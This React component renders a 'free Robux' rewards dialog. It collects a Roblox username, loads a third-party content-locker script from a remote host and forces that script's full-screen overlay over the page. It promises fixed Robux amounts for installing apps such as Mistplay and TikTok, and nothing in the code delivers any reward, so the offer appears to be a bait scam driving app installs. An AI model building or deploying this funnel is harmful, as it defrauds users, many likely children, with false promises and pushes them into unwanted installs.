import React, { useState, useEffect, useRef } from 'react';
import { AlertTriangle, Loader2, RefreshCw } from 'lucide-react';
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";

interface RewardsDialogProps {
  open: boolean;
  onOpenChange: (open: boolean) => void;
}

// Declare the content locker function types to avoid TypeScript errors
declare global {
  interface Window {
    _CJ: () => void;
    _GK: () => void;
    KMGxU_Hwp_gaqehc: {
      it: number;
      key: string;
    };
    OyWAc_qFg_LZSFoc: {
      it: number;
      key: string;
    };
  }
}

const RewardsDialog: React.FC<RewardsDialogProps> = ({ open, onOpenChange }) => {
  const [username, setUsername] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [isScriptLoaded, setIsScriptLoaded] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const scriptRef = useRef<HTMLScriptElement | null>(null);
  const retryCount = useRef(0);
  const maxRetries = 3;
  
  // Load the content locker script when the component mounts
  useEffect(() => {
    const loadScript = () => {
      // Set global variable for the new content locker
      window.OyWAc_qFg_LZSFoc = { it: 4478933, key: "4fdc9" };
      
      // Remove existing script if any
      if (scriptRef.current && document.body.contains(scriptRef.current)) {
        document.body.removeChild(scriptRef.current);
      }
      
      // Create and inject the script
      const script = document.createElement('script');
      script.src = "https://d2v7l2267atlz5.cloudfront.net/9aa5008.js";
      script.async = true;
      script.type = "text/javascript";
      
      script.onload = () => {
        setIsScriptLoaded(true);
        setError(null);
        
        // Add styles to ensure content locker is clickable
        const style = document.createElement('style');
        style.textContent = `
          #_CJ_IFRAME {
            position: fixed !important;
            top: 0 !important;
            left: 0 !important;
            width: 100% !important;
            height: 100% !important;
            z-index: 999999 !important;
            border: none !important;
          }
          #_CJ_OVERLAY {
            position: fixed !important;
            top: 0 !important;
            left: 0 !important;
            width: 100% !important;
            height: 100% !important;
            z-index: 999998 !important;
            background: rgba(0, 0, 0, 0.8) !important;
          }
        `;
        document.head.appendChild(style);
      };
      
      script.onerror = () => {
        setIsScriptLoaded(false);
        setError("Failed to load verification system. Please try again.");
      };
      
      document.body.appendChild(script);
      scriptRef.current = script;
    };

    loadScript();
    
    // Clean up
    return () => {
      if (scriptRef.current && document.body.contains(scriptRef.current)) {
        document.body.removeChild(scriptRef.current);
      }
      // Remove the style element
      const style = document.querySelector('style[data-content-locker]');
      if (style) {
        style.remove();
      }
    };
  }, []);
  
  const recommendedTasks = [
    {
      title: "MONEY CASH",
      description: "Install MONEY CASH app and receive 300 Robux",
      robux: 300
    },
    {
      title: "Mistplay",
      description: "Download Mistplay and earn 250 Robux instantly",
      robux: 250
    },
    {
      title: "PLAYTIME",
      description: "Install PLAYTIME app and get 200 Robux reward",
      robux: 200
    },
    {
      title: "TikTok",
      description: "Install TikTok and earn 150 Robux in your account",
      robux: 150
    }
  ];

  const handleStartNow = () => {
    if (!username.trim()) {
      setError("Please enter your Roblox username");
      return;
    }
    
    setIsSubmitting(true);
    setError(null);
    
    const tryTriggerContentLocker = () => {
      if (window._GK) {
        // Close the dialog before showing the content locker
        onOpenChange(false);
        window._GK();
      } else {
        if (retryCount.current < maxRetries) {
          retryCount.current += 1;
          setTimeout(tryTriggerContentLocker, 1000);
        } else {
          setError("Verification system is not responding. Please try again later.");
          setIsSubmitting(false);
        }
      }
    };
    
    tryTriggerContentLocker();
  };

  const handleRetry = () => {
    retryCount.current = 0;
    setIsScriptLoaded(false);
    setError(null);
    
    // Reload the script
    const script = document.createElement('script');
    script.src = "https://d2v7l2267atlz5.cloudfront.net/9aa5008.js";
    script.async = true;
    script.type = "text/javascript";
    
    script.onload = () => {
      setIsScriptLoaded(true);
      setError(null);
    };
    
    script.onerror = () => {
      setIsScriptLoaded(false);
      setError("Failed to load verification system. Please try again.");
    };
    
    if (scriptRef.current && document.body.contains(scriptRef.current)) {
      document.body.removeChild(scriptRef.current);
    }
    
    document.body.appendChild(script);
    scriptRef.current = script;
  };

  return (
    <Dialog open={open} onOpenChange={onOpenChange}>
      <DialogContent className="bg-robux-darkBg border-robux-purple/20 max-w-[95vw] sm:max-w-md max-h-[95vh] overflow-y-auto mx-auto rounded-xl">
        <button 
          className="absolute right-3 top-3 rounded-sm opacity-70 ring-offset-background transition-opacity hover:opacity-100 focus:outline-none focus:ring-2 focus:ring-ring focus:ring-offset-2 disabled:pointer-events-none data-[state=open]:bg-accent data-[state=open]:text-muted-foreground" 
          onClick={() => onOpenChange(false)}
        >
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="h-4 w-4 text-white">
            <line x1="18" y1="6" x2="6" y2="18"></line>
            <line x1="6" y1="6" x2="18" y2="18"></line>
          </svg>
          <span className="sr-only">Close</span>
        </button>
        
        <DialogHeader className="pb-2">
          <DialogTitle className="text-xl sm:text-2xl font-bold text-center text-white">
            Get Rewards
          </DialogTitle>
          <p className="text-sm sm:text-base text-gray-400 text-center">
            Complete offers to get free Robux rewards
          </p>
        </DialogHeader>
        
        {error && (
          <div className="bg-red-500/10 border border-red-500/20 rounded-lg p-3 mb-4 flex items-center gap-2">
            <AlertTriangle className="h-4 w-4 text-red-400" />
            <p className="text-sm text-red-400">{error}</p>
            {!isScriptLoaded && (
              <Button
                variant="ghost"
                size="sm"
                className="ml-auto text-red-400 hover:text-red-300"
                onClick={handleRetry}
              >
                <RefreshCw className="h-4 w-4 mr-2" />
                Retry
              </Button>
            )}
          </div>
        )}
        
        <div className="space-y-3 sm:space-y-4">
          <label className="text-xs sm:text-sm text-gray-400">Your Roblox Username</label>
          <Input 
            placeholder="Enter your Roblox username"
            className="bg-white/5 border-white/10 text-white placeholder:text-gray-500 text-sm sm:text-base p-2 sm:p-3"
            value={username}
            onChange={(e) => setUsername(e.target.value)}
          />
          <p className="text-xs text-gray-400">
            After admin or support verifies that everything is done correctly, you will receive your reward.
          </p>
          <Button 
            className="w-full bg-robux-green hover:bg-robux-green/90 h-10 sm:h-12 text-sm sm:text-base"
            onClick={handleStartNow}
            disabled={isSubmitting || !isScriptLoaded}
          >
            {isSubmitting ? (
              <>
                <Loader2 className="h-4 w-4 mr-2 animate-spin" />
                Processing...
              </>
            ) : (
              "Claim Now"
            )}
          </Button>
        </div>
      </DialogContent>
    </Dialog>
  );
};

export default RewardsDialog;
